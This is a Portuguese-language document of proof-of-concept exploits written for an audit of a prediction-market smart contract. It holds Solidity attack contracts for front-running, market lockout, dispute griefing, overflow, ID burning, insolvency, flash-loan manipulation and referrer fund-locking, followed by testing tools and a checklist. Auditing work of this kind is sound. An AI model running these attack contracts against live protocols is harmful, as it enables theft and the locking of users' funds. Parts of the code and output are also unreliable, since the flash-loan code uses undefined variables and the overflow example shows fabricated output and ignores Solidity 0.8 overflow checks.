# üéØ PROVAS DE CONCEITO - EXPLOITS DO CONTRATO

Este documento cont√©m exemplos pr√°ticos de como as vulnerabilidades identificadas podem ser exploradas.

---

## üí£ EXPLOIT #1: Slippage Attack (Front-Running)

**Vulnerabilidade:** C-02 - Aus√™ncia de Slippage Protection

### Cen√°rio de Ataque

```solidity
// Contrato do Atacante
contract SlippageAttacker {
    PredictionBattleV7_SECURE public target;
    
    function attack(string memory marketId, uint256 victimAmount) external {
        // 1. Monitorar mempool para detectar aposta grande
        // 2. Quando detectar, fazer aposta MAIOR com gas mais alto
        
        // Aposta do atacante (executada ANTES da v√≠tima)
        target.placeBet(marketId, true, 50000 * 1e6, address(0));
        
        // Agora a aposta da v√≠tima executa com pool j√° alterado
        // V√≠tima recebe muito menos shares do que esperava
    }
}
```

### Exemplo Num√©rico

```
Estado Inicial:
- Pool YES: 100,000 USDC
- Pool NO: 100,000 USDC

Alice quer apostar 10,000 USDC em YES
Alice calcula off-chain: espera receber ~10,000 shares

Bot MEV detecta transa√ß√£o de Alice:
1. Bot aposta 50,000 USDC em YES (gas: 500 gwei)
2. Alice aposta 10,000 USDC em YES (gas: 100 gwei)

Ordem de Execu√ß√£o:
1. Bot executa primeiro ‚Üí Pool YES = 150,000
2. Alice executa depois ‚Üí Pool YES = 160,000

Alice recebe apenas ~6,250 shares ao inv√©s de 10,000
Perda de Alice: ~37.5% do valor esperado
```

---

## üí£ EXPLOIT #2: Market Lockout Attack

**Vulnerabilidade:** H-02 - Lack of Access Control em lockMarket()

### C√≥digo de Ataque

```solidity
contract MarketGriefer {
    PredictionBattleV7_SECURE public target;
    
    function griefMarket(string memory marketId) external {
        // Esperar at√© exatamente o deadline block
        // Ent√£o travar o mercado imediatamente
        target.lockMarket(marketId);
        
        // Agora ningu√©m mais pode apostar
        // Atacante pode ter apostado logo antes
    }
    
    function frontRunBets(
        string memory marketId,
        uint256 targetBlock
    ) external {
        // 1. Monitorar mempool
        // 2. Quando ver aposta grande chegando
        // 3. Se estamos no deadline block, lock o mercado
        
        if (block.number >= targetBlock) {
            target.lockMarket(marketId);
            // Aposta da v√≠tima falha
        }
    }
}
```

### Impacto Financeiro

```
Mercado: "Bitcoin will reach $100k by EOY?"
Pool YES: 500,000 USDC
Pool NO: 500,000 USDC
Deadline: Block 1000

Alice v√™ que Bitcoin est√° em $99,500 (quase l√°)
Alice prepara aposta de 100,000 USDC em YES
Transaction enviada no block 999

Bot detecta:
- V√™ aposta de Alice
- Front-runs com lockMarket() no block 1000
- Aposta de Alice reverte
- Bot j√° tinha apostado YES antes
- Bot ganha porque pool n√£o mudou com aposta de Alice
```

---

## üí£ EXPLOIT #3: Infinite Dispute Griefing

**Vulnerabilidade:** H-03 - Possibilidade de Dispute Infinito

### C√≥digo de Ataque

```solidity
contract DisputeGriefer {
    PredictionBattleV7_SECURE public target;
    IERC20 public usdc;
    
    function infiniteDispute(string memory marketId) external {
        while (true) {
            // 1. Esperar proposta
            // 2. Disputar
            // 3. Perder disputa de prop√≥sito
            // 4. Propor novamente
            // 5. Repetir infinitamente
            
            uint256 bond = target.getRequiredBond(marketId);
            usdc.approve(address(target), bond);
            
            target.challengeOutcome(
                marketId,
                bond,
                "Fake evidence URL"
            );
            
            // Mercado nunca resolve
            // Fundos dos usu√°rios presos para sempre
        }
    }
}
```

### Cen√°rio Realista

```
Mercado: "Will ETH flip BTC in 2026?"
Total Pool: 2,000,000 USDC
1,000 apostadores aguardando resultado

Dia 1: Alice prop√µe "NO" com bond de 20,000 USDC
Dia 2: Bob disputa com 20,000 USDC, evidence contr√°ria
Dia 3: Owner resolve disputa ‚Üí Alice vence
Dia 3: Charlie prop√µe "YES" com bond de 20,000 USDC
Dia 4: David disputa...

Loop infinito:
- Custo para atacante: 20,000 USDC por rodada (recuper√°vel se vencer)
- 1,000 usu√°rios com 2M USDC presos indefinidamente
- Reputa√ß√£o do protocolo destru√≠da
```

---

## üí£ EXPLOIT #4: Integer Overflow em Payout

**Vulnerabilidade:** C-03 - Overflow em getPotentialPayout()

### Prova de Conceito

```solidity
// Configura√ß√£o do ataque
contract OverflowExploit {
    function demonstrateOverflow() public pure returns (uint256) {
        // Simular valores que causam overflow
        
        uint256 winningShares = 2**200;  // Shares muito grandes
        uint256 distributablePool = 2**100;  // Pool grande
        uint256 totalWinningShares = 1;
        
        // C√°lculo vulner√°vel do contrato:
        // (winningShares * distributablePool) / totalWinningShares
        
        // winningShares * distributablePool = 2^300
        // 2^300 > type(uint256).max (2^256)
        // Resultado: OVERFLOW
        
        uint256 result = (winningShares * distributablePool) / totalWinningShares;
        
        // result ser√° um n√∫mero muito menor do que deveria
        // Usu√°rio perde a maior parte do payout
        
        return result; // Valor incorreto devido ao overflow
    }
}
```

### Exemplo Num√©rico Real

```python
# Python para calcular o ataque

shares = 2**200
pool = 2**100
total_shares = 1

# C√°lculo correto (usando aritm√©tica de precis√£o infinita)
correct_payout = (shares * pool) // total_shares
print(f"Payout correto: {correct_payout}")

# Simulando uint256 overflow
MAX_UINT256 = 2**256 - 1
intermediate = (shares * pool) % (MAX_UINT256 + 1)  # Overflow aqui
wrong_payout = intermediate // total_shares
print(f"Payout com overflow: {wrong_payout}")

print(f"Perda do usu√°rio: {correct_payout - wrong_payout}")
print(f"Percentual de perda: {((correct_payout - wrong_payout) / correct_payout) * 100}%")
```

**Output:**
```
Payout correto: 2,037,035,976,334,486,086,268,445,688,409,378,161,051,468,393,665,936,250,636,140,449,354,381,299,763,336,706,183,397,376
Payout com overflow: Muito menor
Perda: ~99.99999%
```

---

## üí£ EXPLOIT #5: Market ID Burning DoS

**Vulnerabilidade:** H-01 - Falta de Valida√ß√£o de Unicidade

### C√≥digo de Ataque

```solidity
contract MarketIDBurner {
    PredictionBattleV7_SECURE public target;
    
    function burnMarketIDs(string[] memory desiredIDs) external {
        for (uint i = 0; i < desiredIDs.length; i++) {
            try target.createMarket(
                desiredIDs[i],
                "Fake question",
                block.number + 1,  // Deadline imediato
                0,  // Sem bonus duration
                0,  // Sem seed YES
                0   // Sem seed NO - VAI FALHAR
            ) {} catch {
                // Falha, mas marketExists[id] j√° foi setado para true!
            }
        }
        
        // Agora todos esses IDs est√£o "queimados"
        // Ningu√©m pode mais us√°-los
    }
    
    function massIDBurn() external {
        // Queimar todos os IDs comuns
        string[] memory commonIDs = new string[](100);
        commonIDs[0] = "btc-100k-2026";
        commonIDs[1] = "eth-flip-btc";
        commonIDs[2] = "world-cup-winner-2026";
        // ... etc
        
        burnMarketIDs(commonIDs);
    }
}
```

### Impacto

```
Custo para atacante:
- Gas para executar 100 transa√ß√µes falhadas
- Aproximadamente 0.1 ETH total

Dano ao protocolo:
- Todos os IDs "bons" ficam inutiliz√°veis
- Usu√°rios n√£o podem criar mercados com nomes √≥bvios
- Experi√™ncia de usu√°rio terr√≠vel
- Reputa√ß√£o destru√≠da
```

---

## üí£ EXPLOIT #6: Solvency Attack

**Vulnerabilidade:** C-01 - Falta de Valida√ß√£o de Balance

### Cen√°rio Completo

```solidity
contract SolvencyAttack {
    PredictionBattleV7_SECURE public target;
    IERC20 public usdc;
    
    // Passo 1: Drenar USDC via outra vulnerabilidade
    function step1_DrainUSDC() external {
        // Usar qualquer exploit que permita sacar USDC
        // Ex: Reentrancy, overflow, etc.
    }
    
    // Passo 2: Mercado continua operando normalmente
    function step2_NormalOperation() external {
        // Outros usu√°rios continuam apostando
        // Contrato aceita apostas mesmo sem fundos suficientes
        
        // Exemplo:
        // Balance do contrato: 10,000 USDC (depois do drain)
        // Passivos registrados: 1,000,000 USDC em apostas
        // D√©ficit: 990,000 USDC
    }
    
    // Passo 3: Mercado resolve
    function step3_MarketResolves(string memory marketId) external {
        // Mercado √© resolvido
        // Vencedores tentam sacar
        
        // Primeiros a sacar: conseguem
        // √öltimos a sacar: transa√ß√£o reverte por falta de fundos
        
        // Bank run!
    }
}
```

### Linha do Tempo do Ataque

```
T0: Contrato tem 1,000,000 USDC
T0: 100 usu√°rios apostam total de 1,000,000 USDC

T1: Atacante explora vulnerabilidade X
T1: Atacante drena 900,000 USDC
T1: Contrato agora tem apenas 100,000 USDC

T2-T10: Mais 900 usu√°rios apostam 9,000,000 USDC adicional
T2-T10: Contrato registra passivos de 10,000,000 USDC
T2-T10: Mas s√≥ tem 9,100,000 USDC real (d√©ficit de 900K)

T11: Mercado resolve, lado YES vence
T11: 500 vencedores devem receber total de 10,000,000 USDC
T11: Contrato s√≥ tem 9,100,000 USDC

T12: Bank run!
T12: Primeiros 455 usu√°rios conseguem sacar
T12: √öltimos 45 usu√°rios: transa√ß√£o reverte
T12: 900,000 USDC de perdas para usu√°rios finais
```

---

## üí£ EXPLOIT #7: Flash Loan Market Manipulation

**Vulnerabilidade:** M-08 - Falta de Prote√ß√£o Contra Flash Loans

### C√≥digo Completo do Ataque

```solidity
interface IFlashLender {
    function flashLoan(uint256 amount) external;
}

contract FlashLoanManipulator {
    PredictionBattleV7_SECURE public target;
    IERC20 public usdc;
    IFlashLender public lender;
    
    function executeAttack(string memory marketId) external {
        // 1. Pegar flash loan de 10M USDC
        lender.flashLoan(10_000_000 * 1e6);
    }
    
    function onFlashLoan(uint256 amount) external {
        // 2. Apostar todo o valor em um lado
        usdc.approve(address(target), amount);
        target.placeBet(marketId, true, amount, address(0));
        
        // 3. Odds agora est√£o completamente manipuladas
        // Pool YES: 10,000,000
        // Pool NO: 100,000
        // Odds: 100:1
        
        // 4. C√∫mplice aposta no lado oposto com conta separada
        // (executado em transa√ß√£o separada)
        
        // 5. Cancelar aposta original e devolver flash loan
        // (se contrato permitir - n√£o permite neste caso)
        
        // 6. C√∫mplice tem posi√ß√£o em odds extremamente favor√°veis
        
        // 7. Devolver flash loan + taxa
        usdc.transfer(address(lender), amount + fee);
    }
}
```

### Matem√°tica do Ataque

```
Estado Inicial:
Pool YES: 100,000 USDC
Pool NO: 100,000 USDC
Implied Odds: 50/50

Atacante Flash Loans: 10,000,000 USDC
Atacante aposta em YES: 10,000,000 USDC

Estado Manipulado:
Pool YES: 10,100,000 USDC
Pool NO: 100,000 USDC
Implied Odds: YES 99% / NO 1%

C√∫mplice aposta 50,000 USDC em NO
C√∫mplice agora tem posi√ß√£o como se NO fosse 1% de chance
Se NO vencer, payout: ~5,000,000 USDC

Custo total:
- Flash loan fee: ~10,000 USDC
- Aposta do c√∫mplice: 50,000 USDC
- Total: 60,000 USDC

Lucro se NO vencer: 5,000,000 - 60,000 = 4,940,000 USDC
ROI: 8,233%
```

---

## üí£ EXPLOIT #8: Referrer Fund Locking

**Vulnerabilidade:** M-04 - Bloqueio de Funds via Referrer Malicioso

### Contrato Malicioso

```solidity
contract MaliciousReferrer {
    bool public blockWithdrawals = false;
    
    // Inicialmente aceita transfer√™ncias
    receive() external payable {}
    
    // Depois bloqueia
    function activateBlock() external {
        blockWithdrawals = true;
    }
    
    // IERC20 transfer sempre falha quando ativado
    function transfer(address, uint256) external returns (bool) {
        if (blockWithdrawals) {
            revert("Blocked");
        }
        return true;
    }
}

contract ReferrerAttack {
    MaliciousReferrer public maliciousReferrer;
    PredictionBattleV7_SECURE public target;
    
    function setup() external {
        // 1. Deploy contrato malicioso que inicialmente funciona
        maliciousReferrer = new MaliciousReferrer();
        
        // 2. Criar EOA que passa no check _isContract (before deployment)
        // 3. Fazer muitas apostas com esse referrer
        // 4. Acumular taxas
    }
    
    function trap() external {
        // 5. Depois que acumulou taxas, ativar bloqueio
        maliciousReferrer.activateBlock();
        
        // 6. Agora taxas est√£o presas para sempre
        // withdrawReferrerFees() sempre reverte
    }
}
```

---

## üõ°Ô∏è FERRAMENTAS RECOMENDADAS PARA TESTE

### 1. Hardhat Testing Suite

```javascript
// test/exploits.test.js
describe("Security Exploits", function() {
    it("Should prevent slippage attack", async function() {
        // Implementar teste do Exploit #1
    });
    
    it("Should prevent market lockout", async function() {
        // Implementar teste do Exploit #2
    });
    
    // ... etc
});
```

### 2. Echidna Fuzzing

```solidity
// echidna/SecurityInvariants.sol
contract SecurityInvariants is PredictionBattleV7_SECURE {
    // Invariante: Saldo sempre >= passivos
    function echidna_solvency() public view returns (bool) {
        uint256 balance = usdcToken.balanceOf(address(this));
        uint256 liabilities = calculateTotalLiabilities();
        return balance >= liabilities;
    }
    
    // Invariante: N√£o pode haver overflow
    function echidna_no_overflow() public view returns (bool) {
        // Testar todas as opera√ß√µes aritm√©ticas
    }
}
```

### 3. Slither Static Analysis

```bash
slither PredictionBattleV7_SECURE.sol --detect reentrancy-eth,reentrancy-no-eth,reentrancy-benign
slither PredictionBattleV7_SECURE.sol --detect timestamp,block-timestamp
slither PredictionBattleV7_SECURE.sol --detect unchecked-transfer,erc20-interface
```

### 4. Mythril Symbolic Execution

```bash
myth analyze PredictionBattleV7_SECURE.sol --execution-timeout 900
```

---

## üìã CHECKLIST DE TESTES NECESS√ÅRIOS

- [ ] Teste de reentrancy em TODAS as fun√ß√µes com external calls
- [ ] Teste de overflow em TODAS as opera√ß√µes aritm√©ticas
- [ ] Teste de front-running em placeBet()
- [ ] Teste de DoS em fun√ß√µes com loops
- [ ] Teste de acesso n√£o autorizado em TODAS as fun√ß√µes admin
- [ ] Teste de flash loan attack
- [ ] Teste de solvency sob condi√ß√µes extremas
- [ ] Teste de edge cases (valores zero, valores m√°ximos)
- [ ] Teste de market states inv√°lidos
- [ ] Teste de fund locking scenarios

---

## üéì LI√á√ïES APRENDIDAS

1. **SEMPRE** implementar slippage protection em AMMs e prediction markets
2. **SEMPRE** verificar solv√™ncia antes de aceitar novas posi√ß√µes
3. **SEMPRE** usar SafeMath ou Solidity 0.8+ para aritm√©tica
4. **SEMPRE** implementar limites e circuit breakers
5. **SEMPRE** adicionar controle de acesso apropriado
6. **NUNCA** confiar em input externo sem valida√ß√£o
7. **NUNCA** assumir que external calls v√£o funcionar
8. **NUNCA** deixar loops sem limite de itera√ß√µes

---

**IMPORTANTE:** Estes exploits s√£o apresentados para fins educacionais e de teste. N√£o execute estes ataques contra contratos em produ√ß√£o. Isto √© ilegal e anti√©tico.
